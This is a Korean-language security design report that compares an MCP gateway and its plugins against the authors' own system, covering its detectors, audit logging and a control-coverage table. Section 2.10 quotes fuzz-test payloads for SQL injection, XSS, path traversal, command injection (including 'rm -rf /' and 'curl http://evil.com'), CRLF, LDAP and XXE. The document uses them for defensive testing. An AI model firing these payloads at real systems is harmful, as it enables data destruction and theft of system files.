| `encoded_exfil_detection` | `.../encoded_exfil_detection/src/lib.rs` | base64/base64url/hex/percent-encoding/escaped-hex 5종 정규식(`:13-35`)으로 후보를 찾고, Shannon entropy(`shannon_entropy`, `:344-366`)·printable ratio(`:368-381`)·민감 키워드(`SENSITIVE_KEYWORDS`, `:37-52`)·반출 문맥 키워드(`EGRESS_HINTS`, `:54-57`)로 가중 점수를 매긴다(`evaluate_candidate`, `:448-530`). 기본값: `min_entropy=3.3`, `min_suspicion_score=3`, `max_decode_depth=2`(중첩 인코딩을 재귀로 벗기되 깊이 제한, `:89-107`, `scan_text`의 `decode_depth` 재귀 `:600-618`) |
| `sql_sanitizer` | `.../sql_sanitizer/src/issues.rs:20-39`, `scanner.rs` | 단순 키워드 매칭이 아니라, 문자열 리터럴을 먼저 마스킹(`mask_string_literals`, `issues.rs:46-68`)하고 `;` 기준으로 문장을 분리(인용부호 인식, `split_statements`)한 뒤 **문장별로** `DELETE`(WHERE 없이 전체삭제, `DELETE_FROM_RE`)·`UPDATE`(WHERE 없는 전체수정, `UPDATE_RE`+`WHERE_RE`)를 판정한다 — "위험한 변경 문장" 탐지에 초점 |
| `url_reputation` | `.../url_reputation/src/types.rs:6-14`, `filters/patterns.rs:4-26` | `whitelist_domains`/`blocked_domains`(서브도메인까지 걷는 `in_domain_list`)/`allowed_patterns`·`blocked_patterns`(정규식)/`use_heuristic_check`+`entropy_threshold`(휴리스틱)/`block_non_secure_http` 6축 설정 |
| `rate_limiter` | §2.4 | Redis Lua 원자 배치(fixed/sliding/token-bucket) |
| `output_length_guard`, `retry_with_backoff` | 저장소 존재만 확인(`plugins/rust/python-package/output_length_guard/`, `.../retry_with_backoff/`) | 세부 로직은 이번 조사 범위 밖, **확인 못 함** |

각 파일 헤더는 `SPDX-License-Identifier: Apache-2.0`를 명시한다 — 재사용 가능한 오픈소스 라이선스임을 확인.

### 2.7 감사·관측

- `AuditTrail`(`mcpgateway/db.py:6673-6736`): action/resource_type/resource_id/user_id/team_id/client_ip/user_agent/request_path·method/old_values·new_values·changes(JSON)/data_classification/requires_review(bool)/success/error_message/context(JSON)/auth_method/**acting_as**(대리 계정)/**delegation_chain**(JSON, 위임 신원 체인) 컬럼. `PermissionAuditLog`(`:1295`)는 별도로 권한 판정 자체를 기록.
- **해시체인·위변조 방지 없음** — `hash_chain`/`tamper`/`prev_hash`/`chain_hash` 계열 그렙이 전부 매치 실패(hmac/signature 매치는 JWT·웹훅 서명 등 무관 문맥). DB 행을 직접 수정해도 이전 판정과의 연쇄를 깨지 않고는 탐지할 방법이 스키마상 없다 — 우리 v6 해시체인 감사 로그가 갖는 우위를 재확인.
- OTel: `mcpgateway/observability.py`, `plugins/tools_telemetry_exporter/`, `plugins/span_attribute_customizer/`(속성 이름 리매핑, `plugins/config.yaml:20-46`)로 스팬 속성 커스터마이즈까지 지원 — 이 부분은 우리보다 세밀하다(관측 통합 폭이 넓음, 가져올 만한 아이디어).

### 2.8 서버 생명주기

- 등록: `GATEWAYS_CREATE` 권한이면 즉시 등록·활성화(별도 승인 단계 확인 못 함). 페더레이션은 §2.5·기존 BENCHMARK §4대로 검토 없이 피어 도구를 들여온다.
- 헬스체크(`gateway_service.py:4451-5078`): 동시성 제한(`max_concurrent_health_checks`, CPU 코어수 기반 적응형), 개별 타임아웃(`gateway_health_check_timeout`), 실패 시 `reachable=False`(`_handle_gateway_failure`), 성공 시 `last_seen` 갱신·재활성화(`reactivate_gateway`, `:4811-4844`).
- 비활성화: `SERVERS_DELETE`/`GATEWAYS_DELETE` 권한, `state`/`toggle` 하위 리소스로 활성/비활성 전환(`token_scoping.py:128,239`).
- 회로 차단기·watchdog은 §2.4 참조 — 도구 단위이며 서버(게이트웨이) 자체의 생명주기 상태와는 분리된 별도 메커니즘.

### 2.9 MCP 서버 격리·샌드박스

- `mcpgateway/` 전체에서 `seccomp`/`bwrap`/`firejail`/`apparmor`/실제 프로세스 격리 문맥의 `sandbox`/`isolate`를 검색했으나 **매치 0건**(namespace/k8s 관련 오탐만). MCP 서버 프로세스 격리를 규정하는 권한 정책 파일 형식은 존재하지 않는다.
- 격리는 배포 topology(Helm `charts/`, `Containerfile`, K8s 매니페스트)의 몫으로 위임돼 있고 게이트웨이 코드가 관여하지 않는다 — **확인 못 함이 아니라 "없음"으로 확정**.

### 2.10 보안 테스트 — 재사용 가능한 공격 입력

`tests/fuzz/test_security_fuzz.py`(리터럴 페이로드, hypothesis 퍼징과 별도로 고정 리스트 병용):
- SQLi(`:28-35`): `'; DROP TABLE tools; --`, `' OR '1'='1`, `'; INSERT INTO tools (name) VALUES ('hacked'); --`, `' UNION SELECT * FROM users --`, `"; DELETE FROM tools WHERE '1'='1'; --`
- XSS(`:58-66`): `<script>alert('xss')</script>`, `javascript:alert('xss')`, `<img src=x onerror=alert('xss')>`, `</script><script>alert('xss')</script>`, `' onmouseover='alert("xss")'`, `"><script>alert('xss')</script>`
- 경로 탐색(`:107-114`): `../../../etc/passwd`, `..\..\..\windows\system32\drivers\etc\hosts`, `%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd`, `....//....//....//etc/passwd`, `..%252f..%252f..%252fetc%252fpasswd`
- 명령 주입(`:137-146`): `; rm -rf /`, `| cat /etc/passwd`, `$(whoami)`, `` `id` ``, `& ping google.com`, `|| curl http://evil.com`, `'; system('rm -rf /'); '`
- 헤더 주입/CRLF(`:165-171`): `Value\r\nX-Injected: true`, `Value\nSet-Cookie: injected=true`, `Value%0d%0aX-Injected:%20true`
- LDAP 주입(`:187-193`): `*)(&(objectClass=*)`, `admin)(&(password=*))`
- XML/XXE(`:207-212`): `<?xml version='1.0'?><!DOCTYPE test [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><test>&xxe;</test>`

`tests/manual/testcases/security_tests.yaml`은 curl 기반 수동 침투 시나리오(SQLi/JWT 변조/팀 격리 우회/권한 상승/XSS/CSRF/브루트포스/파일 업로드/속도 제한, `:26-150`)로, 리터럴 페이로드보다는 **테스트 절차** 문서라 자동화 재사용성은 낮지만 시나리오 설계 참고용으로는 유용.

## 3. PAC-01~15 대응표

| PAC | 이 제품의 구현 여부 | 근거 |
| --- | --- | --- |
| 01 승인 상태·기간 | **없음** — 자원 단위 승인 상태·유효기간 필드가 확인되지 않음(팀/SSO/컴플라이언스 승인은 다른 종류) | §2.3 |
| 02 기준상태(버전·해시·정책버전) | **부분** — 배포 정책 버전 자체 식별은 확인 못 함, 도구 계약 해시 없음(§2.5), unified_pdp 캐시 TTL(§2.1)만 시간 개념 존재 | §2.1, §2.5 |
| 03 사용 환경 | **확인 못 함** — 환경 구분 필드를 정책 입력에서 별도로 찾지 못함 | — |
| 04 요청 주체(사용자·Agent·세션) | **있음** — `Subject`(email/roles/team_id/mfa_verified/clearance_level), `context.session_id` | §2.1(B) |
| 05 대리 실행(위임) | **있음, 우리보다 표준화됨** — RFC 8693 token-exchange, `acting_as`/`delegation_chain` 감사 컬럼 | §2.2, §2.7 |
| 06 토큰(발급자·audience·기간·scope) | **있음** — JWT + 토큰 스코프(Layer1) + team_id, audience는 RFC8693 교환 시 지정 가능 | §2.2 |
| 07 서버·Endpoint·최종 접속 대상 | **부분** — 서버 단위 토큰 제한은 있으나 "최종 접속 대상"(인자 목적지) 결합은 확인 못 함 | §2.2 |
| 08 기능 허용목록(정의 해시 포함) | **부분** — 도구 허용/차단은 RBAC·`unified_pdp` native 규칙(`tools.invoke.<name>`)으로 가능하나 **정의 해시 고정 없음**(rug-pull 무방비) | §2.1(B), §2.5 |
| 09 행위 정규화·권한 | **있음** — Permissions enum(`tools.create/read/update/delete/execute` 등), Layer2 RBAC | §2.2 |
| 10 인자 경로에서 자원 추출·범위 | **약함** — `unified_pdp`가 `annotations={"args_keys": list(tool_args.keys())}`만 넘김(키 이름뿐, 값의 경로/명령/수신자 파싱 없음) | §2.1(B) |
| 11 데이터 자산·등급 | **부분** — `classification_level`/`data_classification` 필드는 존재하나 분류를 산출하는 규칙엔진은 확인 못 함(우리 `classify.py`류 없음) | §2.1(B), §2.7 |
| 12 외부 전송 목적지·등급 조합 | **없음** — 목적지×등급 조합 차단 정책 확인 못 함 | — |
| 13 고위험 건별 승인(다이제스트 결합) | **없음** — §2.3에서 확정 | §2.3 |
| 14 철회·중지 | **부분** — 토큰 폐기(`TOKENS_REVOKE`)·팀 멤버십 재검증(60초 캐시)은 있으나 진행 중 실행의 즉시 중단은 확인 못 함 | §2.2 |
| 15 반복·동시·연쇄 실행 제한(원자적 예약) | **정정 — 부분** — RateLimiter는 **코드 공개**, Redis 백엔드는 Lua 배치 스크립트로 다중 dimension을 원자적으로 처리(`redis_backend.rs:31-108,598-664`, 다중 레플리카 간 공유). 단 fail-open/closed를 최종 판정하는 `cpex.framework`는 확인 못 함. CircuitBreaker는 프로세스 로컬 상태(원자적 예약 아님), 연쇄(사슬) 개념 없음 | §2.4 |

## 4. 우리가 가져올 것 (구체적 파일·우선순위)

1. **[상] RFC 8693 token-exchange 참조 구현** — `mcpgateway/services/oauth_manager.py:771-882`(요청 구성·재시도·`token_type` 검증)와
   `mcpgateway/utils/subject_token.py:39-107`(불투명 토큰을 subject_token으로 절대 전달하지 않는 구조적 가드, "H2"). 대리 실행(D-30/OBO 확장) 설계 시
   그대로 참조할 만큼 완성도가 높다.
2. **[상] 상시 활성 입력 검증기 패턴** — `mcpgateway/common/validators.py`의 "플러그인 온오프와 무관하게 항상 실행되는 SecurityValidator" 구조.
   우리도 OPA 판정 전 단계에 입력 형태 자체를 거부하는 상시 계층을 둘 근거가 된다(정규식 목록은 이미 우리 것을 씀).
3. **[중] 감사 스키마의 `acting_as`/`delegation_chain`/`requires_review` 컬럼 아이디어** — `mcpgateway/db.py:6699-6728`. 우리 v6 해시체인에
   위임 체인을 명시적으로 남기는 열을 추가할 근거.
4. **[중] OTel 스팬 속성 커스터마이즈** — `plugins/span_attribute_customizer/span_attribute_customizer.py` + 설정(`plugins/config.yaml:20-46`).
5. **[하] Circuit Breaker/Watchdog 설계는 참고만, 코드는 이식하지 않음** — 프로세스 로컬 상태·사후 감지라는 한계가 있어(§2.4) 우리가 이미 가진
   Redis/DB 기반 원자적 통제가 더 낫다. "half-open 프로브 1건" 패턴은 참고할 만하다.
6. **[하] cpex-plugins의 공개 탐지 규칙(정규식·엔트로피 점수·Lua 원자 배치)은 설계 참조용** — 이번에 원문을 확인했으므로(§2.6) 규칙 아이디어(예:
   base64 반출 탐지의 entropy+egress-context 가중 점수, SQL sanitizer의 "WHERE 없는 DELETE/UPDATE" 문장 판정)는 우리 규칙 설계에 참고할 수 있다.
   단, 새 Rust 실행 의존성을 지금 추가하지는 않는다(§5) — 임계값(오탐률)이 검증되지 않았고, 우리는 이미 동등한 통제(§6·기존 `poisoning.py`)를 가졌다.
   **2026-10-01 반영**: `secrets_detection/src/patterns.rs:8-73`의 규칙 중 발급자 접두어가 있는 것(AWS 액세스·비밀 키, Google,
   GitHub, Stripe, Slack, JWT, 개인키 블록, API 키 할당)은 파이썬 정규식으로 옮겨 `classify.SECRET_PATTERNS`가 됐다
   (D-56). 같은 파일의 `hex_secret_32`·`base64_24`는 커밋 해시·SHA-256 digest를 매번 잡아 외부 전송 차단 근거로
   쓸 수 없어 옮기지 않았다.

## 5. 가져오지 않을 것 (이유 한 줄)

| 기능 | 이유 |
| --- | --- |
| `unified_pdp`의 다중 PDP 조합(all/any/first_match) | 정책 원천 단일화(D-25)와 배포 digest 식별을 흐림 |
| `unified_pdp` 판정 캐시(60초 TTL, 전체 플러시만 가능) | §2.1(B) — 승인 만료·철회처럼 시간에 따라 바뀌는 판정에 stale 창을 만듦 |
| 페더레이션·가상 서버 | 검토 없는 도구 유입(D-05 위반) |
| `RateLimiterPlugin`/`SecretsDetection`/`PIIFilter`/`SQLSanitizer` 등 cpex-plugins 규칙 | **정정** — 이유가 "탐지 로직이 비공개"였던 기존 문장은 틀렸다(공개 확인, §2.6). 채택하지 않는 실제 이유는 (1) 이를 실행 배선하는 `cpex.framework`가 별도 비공개/미확인 의존성이라는 점, (2) 새 Rust 실행 의존성을 추가하는 비용, (3) 임계값(entropy·suspicion score 등)의 오탐률이 우리 트래픽으로 검증되지 않았다는 점이다 |
| `WatchdogPlugin`을 실행 타임아웃으로 오인해 도입 | §2.4에서 확인 — 사후 감지일 뿐 실행을 끊지 못해 가용성 문제 해결에 무용 |
| `deny_filter`/`code_safety_linter`의 훅 스코프 그대로 차용 | 각각 prompt_pre_fetch만, tool_post_invoke만으로 좁아 우리 요구(입력+출력 모두)에 못 미침 |
| `elicitation_service.py`를 승인 대체로 사용 | MCP 프로토콜의 구조화 입력 요청일 뿐 정책 승인과 무관(§2.3) |

## 6. 재사용 가능한 탐지 규칙·테스트 입력 경로

- `mcpgateway/common/validators.py:92-243` — HTML/JS/폴리글랏/SSTI/URL스킴/SQL/셸 정규식 원문(코드 공개, 상시 활성).
- `plugins/code_safety_linter/code_safety_linter.py:40-48` — 위험 코드 패턴 5종.
- `plugins/harmful_content_detector/` + `plugins/config.yaml:741-760` — self_harm/violence/hate 어휘 정규식.
- `plugins/deny_filter/deny.py:36-67` — 재귀 문자열 스캔 로직(참고용, 규칙 자체는 없음).
- `tests/fuzz/test_security_fuzz.py:28-217` — SQLi/XSS/경로탐색/명령주입/헤더주입/LDAP/XXE 리터럴 페이로드, 그대로 회귀 테스트 입력으로 복사 가능.
- `tests/manual/testcases/security_tests.yaml` — 수동 침투 시나리오 절차(자동화 재사용성 낮음, 설계 참고용).
- **정정 — `IBM/cpex-plugins`(Apache-2.0, 커밋 `ae26938`)의 공개 탐지 규칙**(§2.6에 전문 인용, "저장소에 원문이 없다"던 기존 결론은 틀렸다):
  - `plugins/rust/python-package/pii_filter/src/patterns.rs:32-158` — SSN/BSN/신용카드/이메일/전화/IP/생년월일/여권/운전면허/은행계좌 정규식 10종.
  - `plugins/rust/python-package/secrets_detection/src/patterns.rs:8-73` — AWS/GCP/GitHub/Stripe/generic API key/Slack/private key/JWT/hex/base64 정규식 11종.
  - `plugins/rust/python-package/encoded_exfil_detection/src/lib.rs:13-107,344-530` — base64/hex/percent/escaped-hex 탐지 정규식 + entropy/printable-ratio/keyword 가중 점수 로직.
  - `plugins/rust/python-package/sql_sanitizer/src/issues.rs:20-68`, `scanner.rs` — WHERE 없는 DELETE/UPDATE 문장 탐지, 문자열 리터럴 마스킹.
  - `plugins/rust/python-package/url_reputation/src/filters/patterns.rs:4-26`, `types.rs:6-14` — 도메인 allow/block 리스트·정규식·휴리스틱 판정 구조.
  - `plugins/rust/python-package/rate_limiter/src/redis_backend.rs:31-108` — fixed/sliding/token-bucket 원자 Lua 스크립트 3종(그대로 참고 가능한 알고리즘).

## 7. 조사 범위와 한계

- 클론된 두 커밋(`5735c9d`의 `mcpgateway/`·`plugins/`(in-repo 부분)·`tests/`, `ae26938`의 `IBM/cpex-plugins` 전체)을 직접 읽었다.
  이전 조사에서 "비공개"로 단정했던 `cpex-*` 8개 패키지 중 pii_filter/secrets_detection/encoded_exfil_detection/sql_sanitizer/url_reputation/rate_limiter
  6개는 이번에 Rust 소스를 직접 읽고 정정했다. `output_length_guard`·`retry_with_backoff`는 저장소 존재만 확인했고 세부 로직은 **확인 못 함**(후속 조사 후보).
  이를 실행 배선하는 `cpex.framework` 자체(우선순위 밴드·`PluginMode`·타임아웃·fail_mode 판정)는 두 클론 어디에도 소스가 없어 여전히 **확인 못 함**
  (`ibm-cpex-plugins/crates/framework_bridge/src/lib.rs:8`이 `cpex.framework`를 외부 Python 모듈로 import할 뿐 — 이 저장소는 Rust 탐지 엔진을
  PyO3로 Python에 바인딩하는 쪽이지, 그것들을 오케스트레이션하는 프레임워크 본체가 아니다).
- `mcpgateway/routers`·`services` 전체(수백 개 파일)를 다 읽지는 못했다. Grep으로 위치를 좁히고 필요한 구간만
  Read했으므로, 그렙 패턴에 걸리지 않는 동의어·다른 이름의 구현이 있다면 놓쳤을 수 있다(특히 §2.3 승인·§2.9 샌드박스의
  "없음" 판정은 이 방식의 한계를 안고 있다 — 그렙 0건을 "존재하지 않음"의 근거로 썼다).
- `docs/` 아래 ContextForge 자체 문서(mkdocs)는 이번 조사에서 읽지 않았다 — 전부 소스 코드 직접 확인을 우선했다.
  문서와 코드가 불일치하는 지점(§2.1 OPA 어댑터의 URL 경로)이 실제로 있었으므로, 문서 근거보다 코드 근거를 우선한
  이번 방침이 유효했다고 판단한다.

## 우리 구조에 적용한 결론

1. 승인 대상은 설치 가능한 모든 확장 프로그램이 아니라 **등록된 resource·도구 계약·주체·유효기간**이다.
2. endpoint agent와 native managed policy는 직접 MCP 경로를 제한한다. 셸·브라우저·독립 앱의 API 호출은
   네트워크·OS·IdP 통제가 필요하다. Gateway가 통제했다는 로그가 없는 경우를 "허용"으로 집계하지 않는다.
3. SQL AST는 문법을 판정할 뿐 DB의 view·함수·operator 부작용까지 증명하지 못한다. 검토되지 않은 함수는
   고위험으로 분류하고, 실서비스는 DB 권한과 읽기 전용 계정을 함께 적용해야 한다.
4. 경쟁 제품의 부재를 차별점으로 내세우기 전에 공개 별도 저장소와 외부 PDP 구성을 조사한다 — 이번에 cpex-plugins를
   놓쳐 "비공개"로 잘못 단정했던 것이 그 실패 사례다.
5. 재사용할 것은 입력 검증·분리된 자격·원자적 제한·장애 시 효과 시험이다. 플랫폼 전체를 이식하지 않는다.

## 후속 비교 시험의 조건

IBM을 실행 비교할 때는 플러그인 버전과 mode, Redis 실제 연결, 실패 정책을 고정한다. 동일한 주체로
동시 burst를 보내고 Gateway 응답뿐 아니라 별도 DB 변화·호스트 패킷을 관측한다. 입력 공격과 정상
대조군은 동일 프로토콜을 쓴다. 결과에 미확인 상태, 사후 마스킹, 실행 전 거부를 따로 기록한다.
`cpex.framework`의 실제 fail_mode 배선(§0, §2.4)은 여전히 소스가 없으므로, 실행 비교 없이는 rate limiter의
원자성이 실제 요청 경로에서 어떻게 소비되는지 확정할 수 없다.
이번 우리 클린 테스트 결과와 범위는 [OVERHAUL_VALIDATION_2026-09-30.md](OVERHAUL_VALIDATION_2026-09-30.md)에 기록한다.
